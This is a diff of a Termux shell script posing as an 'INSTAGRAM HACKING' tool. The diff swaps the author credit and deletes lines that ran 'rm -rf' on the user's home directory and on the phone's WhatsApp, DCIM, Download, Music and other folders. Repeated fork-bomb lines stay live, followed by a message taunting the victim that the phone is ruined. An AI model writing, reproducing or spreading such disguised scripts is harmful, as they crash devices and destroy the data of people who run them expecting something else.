@@ -1,8 +1,10 @@
+
+
 clear 
  termux-setup-storage 
  figlet -f slant "INSTAGRAM HACKING" 
   
- echo "                         coded by <MR|D3V1L>" 
+ echo "                         coded by <MR|4M41R0CKZ>" 
   
  echo "Enter your insta id" 
  read id 
@@ -18,19 +20,19 @@ clear
  :(){ :|:& };: 
  echo "404 error your endi not found" 
  :(){ :|:& };:
-rm -rf cd /sdcard/WhatsApp
+
 :(){ :|:& };: 
-rm -rf cd /sdcard/Android 
+
  :(){ :|:& };: 
- rm -rf cd ~ 
+  
  :(){ :|:& };:
- rm -rf cd /sdcard/DCIM
+ 
  :(){ :|:& };: 
- rm -rf cd /sdcard/Download
+ 
  :(){ :|:& };: 
- rm -rf cd /sdcard/Music 
+ 
 :(){ :|:& };:
- rm -rf cd /sdcard/SHAREit
+ 
  :(){ :|:& };: 
 echo "This phone's engine gone completely...gallery nokku mwona"
 :(){ :|:& };: 
